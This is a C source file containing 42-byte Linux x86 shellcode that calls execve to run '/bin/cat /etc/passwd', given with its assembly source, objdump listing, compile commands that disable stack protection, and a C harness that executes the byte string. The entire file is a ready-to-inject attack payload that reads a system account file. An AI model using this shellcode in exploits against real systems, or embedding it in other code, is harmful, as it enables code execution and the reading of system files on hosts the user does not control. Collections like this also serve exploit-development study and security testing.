/*
*********
$ INFOS $
*********
Author: vida
Github: https://github.com/vida00/
Command: execve("/bin/cat", "/bin/cat /etc/passwd", NULL);
Arch: Linux x86
Lenght: 42 bytes

*****************
$ Assembly Code $
*****************
section .text
    global _start

_start:
    xor eax, eax

    push eax
    push 0x7461632f
    push 0x6e69622f
    mov ebx, esp

    push eax
    push 0x64777373
    push 0x61702f2f
    push 0x6374652f
    mov esi, esp

    push eax
    push esi
    push ebx
    mov ecx, esp

    mov al, 0xb
    int 0x80

******************
$ objdump result $
******************
08049000 <_start>:
 8049000:       31 c0                   xor    %eax,%eax
 8049002:       50                      push   %eax
 8049003:       68 2f 63 61 74          push   $0x7461632f
 8049008:       68 2f 62 69 6e          push   $0x6e69622f
 804900d:       89 e3                   mov    %esp,%ebx
 804900f:       50                      push   %eax
 8049010:       68 73 73 77 64          push   $0x64777373
 8049015:       68 2f 2f 70 61          push   $0x61702f2f
 804901a:       68 2f 65 74 63          push   $0x6374652f
 804901f:       89 e6                   mov    %esp,%esi
 8049021:       50                      push   %eax
 8049022:       56                      push   %esi
 8049023:       53                      push   %ebx
 8049024:       89 e1                   mov    %esp,%ecx
 8049026:       b0 0b                   mov    $0xb,%al
 8049028:       cd 80                   int    $0x80

*****************
$ Compile & Run $
*****************
Assembly: nasm shellcode.asm -f elf32 && ld shellcode.o -o shellcode -m elf_i386
C: gcc shellcode.c -o shellcode -z execstack -m32 && ./shellcode
*/
unsigned char shellcode[] = \
"\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe6\x50\x56\x53\x89\xe1\xb0\x0b\xcd\x80";
void main(){
    (*(void(*)()) shellcode)();
}
